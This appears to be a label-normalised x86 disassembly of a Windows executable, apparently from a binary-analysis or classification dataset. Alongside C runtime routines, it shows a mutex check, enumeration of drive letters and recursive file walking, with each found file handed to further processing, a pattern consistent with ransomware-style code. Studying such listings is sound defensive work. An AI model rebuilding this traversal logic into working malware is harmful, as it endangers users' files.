je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_409038
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_4031e0
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
cmp esi 0xffffffff
mov [ ebp - 0x2c ] 0x1
jne r-xdata
push [ ebp - 0x1c ]
call sub_40675e
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_405c3e
cmp eax edi
pop ecx
je r-xdata
call sub_409a90
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_405d10
mov esi eax
pop ecx
inc esi
cmp [ ebp - 0x2c ] edi
mov ebx [ WideCharToMultiByte@IAT ]
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_40531e
cmp eax edi
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_405a68
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_409ac4
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
call sub_404dfc
xor ebx ebx
cmp [ rw-data ] ebx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x8 ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x8 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
je r-xdata
push [ rw-data ]
call sub_404e05
cmp eax ebx
pop ecx
je r-xdata
push eax
call sub_404e05
cmp eax ebx
pop ecx
je r-xdata
push eax
call sub_404e05
push [ rw-data ]
mov esi eax
call sub_404e05
cmp esi ebx
pop ecx
pop ecx
mov edi eax
je r-xdata
push eax
call sub_404d8e
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_404d8e
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_404d8e
mov [ rw-data ] eax
lea eax [ ebp - 0xc ]
push eax
call sub_4054fd
test eax eax
pop ecx
pop ecx
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
call eax
jmp r-xdata
call eax
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_406dfe
add esp 0x14
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x8 ]
je r-xdata
call esi
cmp eax ebx
je r-xdata
push r--data
push edi
call esi
push eax
call sub_404d8e
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
push eax
call sub_404e05
cmp eax ebx
pop ecx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_405534
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push 0xc
lea ecx [ ebp - 0x20 ]
push ecx
push 0x1
push eax
call edi
test eax eax
je r-xdata
push r--data
push edi
call esi
push eax
call sub_404d8e
pop ecx
mov [ rw-data ] eax
push [ ebp - 0x4 ]
call eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x10 ] 0x4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_406dfe
add esp 0x14
test [ ebp - 0x18 ] 0x1
jne r-xdata
or [ ebp + 0x10 ] 0x40000
jmp r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
sub_409c81
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_406b99
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_406efa
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop esi
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
sub_409cc7
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_403014
movzx eax [ ebp + 0xc ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp + 0x14 ]
test [ ecx + eax + 0x1d ] dl
jne r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_409d34
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_403014
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_406be2
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_409d83
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ esp + 0x8 ]
call sub_409d34
pop ecx
pop ecx
retn
mov eax [ esp + 0x4 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
retn
sub_409dac
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_409abc
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_409abc
pop ecx
sub_409eb0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409ed0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_409038
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_409f15
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_409f15
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_409ed0
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_409fc5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_409fe4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_409fbc
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_409fc5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_409ff0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_40a090
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40a0e0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40a10b
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x14 ]
call sub_403014
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
xor edi edi
cmp eax edi
je r-xdata
cmp esi edi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] edi
je r-xdata
call sub_406b99
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_406efa
add esp 0x14
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
push ebx
mov bl [ esi ]
mov [ ebp - 0x4 ] edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x14 ]
push eax
movzx eax bl
push 0x8
push eax
call sub_406be2
mov ecx [ ebp - 0x14 ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop edi
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
mov esi [ ecx + 0xc8 ]
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
test cx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
mov cl bl
sub cl 0x61
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
inc edi
mov bl [ edi ]
inc edi
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
test al 0x4
mov esi 0x7fffffff
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_406b99
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov ebx [ ebp - 0x4 ]
imul ebx [ ebp + 0x14 ]
add ebx ecx
mov [ ebp - 0x4 ] ebx
jne r-xdata
mov al [ ebp + 0x18 ]
and al 0x2
neg al
sbb eax eax
neg eax
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_40a336
push ebp
mov ebp esp
xor eax eax
cmp [ rw-data ] eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_40a10b
add esp 0x14
pop ebp
retn
sub_40a360
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_40a3e0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_40a3d0
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40a4c2
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0x0
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ ReleaseMutex@IAT ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call [ CloseHandle@IAT ]
sub_40a505
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
push 0x0
call [ SetLastError@IAT ]
push [ ebp + 0x8 ]
push 0x0
push 0x1f0001
call [ OpenMutexW@IAT ]
mov [ ebp - 0x8 ] eax
call [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x2
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
leave
retn
mov al 0x1
sub_40a546
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call [ PeekMessageW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call [ GetMessageW@IAT ]
lea eax [ ebp - 0x20 ]
push eax
call [ DispatchMessageW@IAT ]
push 0xa
call [ Sleep@IAT ]
mov al 0x1
xor al al
jmp r-xdata
leave
retn
sub_40a5a6
push ebp
mov ebp esp
sub esp 0x690
mov [ ebp - 0x1 ] 0x1
and [ ebp - 0x68c ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x10 ]
call sub_4011f7
cmp [ ebp - 0x68c ] eax
jge r-xdata
mov ecx [ ebp + 0x14 ]
call sub_401ce5
movzx eax al
test eax eax
je r-xdata
push [ ebp - 0x68c ]
mov ecx [ ebp + 0x10 ]
call sub_401ccc
push [ eax ]
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x460 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ ebp - 0x464 ] eax
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
cmp [ ebp - 0x464 ] 0xffffffff
jne r-xdata
xor al al
mov al 0x1
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x480 ]
push eax
call [ PeekMessageW@IAT ]
test eax eax
je r-xdata
jmp r-xdata
leave
retn
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp + 0x18 ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x480 ]
push eax
call [ GetMessageW@IAT ]
lea eax [ ebp - 0x480 ]
push eax
call [ DispatchMessageW@IAT ]
mov eax [ ebp - 0x68c ]
inc eax
mov [ ebp - 0x68c ] eax
push [ ebp - 0x68c ]
mov ecx [ ebp + 0x10 ]
call sub_401ccc
push [ eax ]
lea eax [ ebp - 0x688 ]
push eax
call [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x688 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x688 ]
push eax
call [ lstrcatW@IAT ]
mov eax [ ebp - 0x460 ]
and eax 0x10
jne r-xdata
push [ ebp - 0x464 ]
call [ FindClose@IAT ]
mov ecx [ ebp + 0x14 ]
call sub_401ca3
mov al 0x1
jmp r-xdata
push r--data
lea eax [ ebp - 0x434 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x460 ]
push eax
push [ ebp - 0x68c ]
mov ecx [ ebp + 0x10 ]
call sub_401ccc
push [ eax ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40221e
add esp 0x14
movzx eax al
test eax eax
je r-xdata
jmp r-xdata
push r--data
lea eax [ ebp - 0x434 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x18 ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
je r-xdata
push [ ebp + 0x18 ]
push sub_40a546
lea eax [ ebp - 0x460 ]
push eax
lea eax [ ebp - 0x688 ]
push eax
push 0x70941102
push 0x70941101
mov ecx [ ebp + 0x8 ]
call sub_412619
movzx eax al
test eax eax
je r-xdata
lea eax [ ebp - 0x460 ]
push eax
push [ ebp - 0x464 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x690 ] 0x0
jmp r-xdata
jmp r-xdata
push [ ebp - 0x464 ]
call [ FindClose@IAT ]
mov ecx [ ebp + 0x14 ]
call sub_401ca3
mov al 0x1
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_4159a1
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp eax 0x1b58
jbe r-xdata
push [ ebp - 0x464 ]
call [ FindClose@IAT ]
jmp r-xdata
mov eax [ ebp - 0x690 ]
cmp eax [ rw-data ]
jae r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
cmp [ rw-data ] 0x4600000
jbe r-xdata
mov al 0x1
jmp r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
je r-xdata
push [ ebp - 0x690 ]
mov ecx rw-data
call sub_401ccc
push [ eax ]
lea edx [ ebp - 0x688 ]
mov ecx [ ebp + 0x8 ]
call sub_4134ac
movzx eax al
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x0
lea edx [ ebp - 0x688 ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov edx eax
mov ecx [ ebp + 0x14 ]
call sub_401cb4
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
jmp r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x690 ]
inc eax
mov [ ebp - 0x690 ] eax
sub_40a8ff
push ebp
mov ebp esp
push 0xffffffff
push sub_423cc8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x6d4
push edi
push 0x70941101
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x6d4 ]
call sub_40fbc4
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x38 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x264 ]
call sub_401c30
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x1c ]
call sub_401c30
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x48 ]
call sub_401068
mov [ ebp - 0x4 ] 0x4
mov eax [ r--data ]
mov [ ebp - 0x28 ] eax
mov eax [ r--data ]
mov [ ebp - 0x24 ] eax
xor eax eax
lea edi [ ebp - 0x20 ]
stosw [ edi ]
lea eax [ ebp - 0x264 ]
mov [ ebp - 0x6dc ] eax
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x470 ] eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x6d4 ]
call sub_40fca2
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_415a51
lea ecx [ ebp - 0x38 ]
call sub_4106f0
mov eax [ ebp + 0xc ]
add eax 0x41
mov [ ebp - 0x28 ] ax
mov [ ebp - 0x4c ] 0x104
push 0x104
lea eax [ ebp - 0x254 ]
push eax
push 0x0
push 0x0
push 0x0
push [ ebp - 0x4c ]
lea eax [ ebp - 0x46c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call [ GetVolumeInformationW@IAT ]
test eax eax
je r-xdata
push 0x0
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_413434
mov edx eax
mov ecx [ ebp - 0x470 ]
call sub_401cb4
mov eax [ ebp + 0xc ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
jne r-xdata
push r--data
lea eax [ ebp - 0x46c ]
push eax
call [ lstrcmpiW@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x48 ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x1c ]
call sub_401c6b
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x264 ]
call sub_401c6b
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x38 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x6d4 ]
call sub_40f7b3
and [ rw-data ] 0x0
and [ rw-data ] 0x0
mov [ ebp - 0x4 ] 0x3
lea ecx [ ebp - 0x48 ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x1c ]
call sub_401c6b
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x264 ]
call sub_401c6b
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x38 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x6d4 ]
call sub_40f7b3
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x6dc ]
mov [ ebp - 0x6d8 ] eax
mov eax [ ebp - 0x470 ]
mov [ ebp - 0x6dc ] eax
mov eax [ ebp - 0x6d8 ]
mov [ ebp - 0x470 ] eax
and [ ebp - 0x6e0 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
leave
retn
